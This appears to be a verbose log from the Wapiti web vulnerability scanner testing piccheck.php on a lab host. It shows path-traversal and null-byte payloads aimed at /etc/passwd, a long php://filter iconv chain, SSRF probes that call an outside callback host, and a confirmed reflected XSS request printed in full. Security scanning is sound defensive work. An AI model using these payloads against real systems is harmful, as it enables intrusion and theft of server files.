+2024-03-20 14:31:45.695 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 14:31:45.704 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-20 14:31:45.711 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-20 14:31:45.720 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:31:45.727 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:31:45.736 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
+2024-03-20 14:31:45.744 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-20 14:31:45.753 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-20 14:31:45.761 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 14:31:45.770 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 14:31:45.778 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 14:31:45.786 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 14:31:45.793 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 14:31:45.804 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 14:31:45.812 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 14:31:45.819 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 14:31:45.826 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:31:45.833 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:31:45.841 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:31:45.849 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:31:45.856 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-20 14:31:45.863 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 14:31:45.872 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 14:31:45.879 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 14:31:45.887 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 14:31:45.894 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 14:31:45.901 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 14:31:45.908 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 14:31:45.916 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 14:31:45.923 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:31:45.931 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:31:45.938 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:31:45.946 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:31:45.953 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 14:31:45.961 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 14:31:45.970 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 14:31:45.977 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 14:31:45.985 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 14:31:45.991 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 14:31:45.998 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 14:31:46.007 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 14:31:46.015 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:31:46.021 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:31:46.029 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:31:46.036 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:31:46.043 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-20 14:31:46.050 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 14:31:46.057 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-20 14:31:46.063 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-20 14:31:46.071 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-20 14:31:46.077 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-20 14:31:46.085 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:31:46.091 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:31:46.104 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=piccheck.php
+2024-03-20 14:31:46.114 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=piccheck.php%00
+2024-03-20 14:31:46.126 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=piccheck.php%3A%3A%24DATA
+2024-03-20 14:31:46.158 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-20 14:31:46.185 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-20 14:31:46.197 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:46.197 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/piccheck.php (0)
+	data: name=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fgphj1d%2F1%2F6e616d65%2F&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:46.207 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fgphj1d%2F1%2F7573657266696c65%2F&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:46.213 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fgphj1d%2F1%2F4d41585f46494c455f53495a45%2F
+2024-03-20 14:31:46.237 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=gphj1d for results, please wait...
+2024-03-20 14:31:48.327 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-20 14:31:48.334 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-20 14:31:48.353 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:48.386 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/piccheck.php (0)
+	data: name=%3CScRiPt%3Ealert%28%27wiupoujm47%27%29%3C%2FsCrIpT%3E&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:48.479 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:205 - ---
+2024-03-20 14:31:48.480 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:206 - Reflected Cross Site Scripting in http://web/piccheck.php via injection in the parameter name
+2024-03-20 14:31:48.480 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:216 - Evil request:
+2024-03-20 14:31:48.481 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:217 -     POST /piccheck.php HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    cookie: PHPSESSID=edgie71pehjq43vb69m6v8q4q9
+    content-length: 92
+    Content-Type: application/x-www-form-urlencoded
+
+    name=%3CScRiPt%3Ealert%28%27wiupoujm47%27%29%3C%2FsCrIpT%3E&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:48.481 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:218 - ---
+2024-03-20 14:31:48.515 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-20 14:31:48.536 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:48.586 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
+2024-03-20 14:31:48.631 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//piccheck.json/
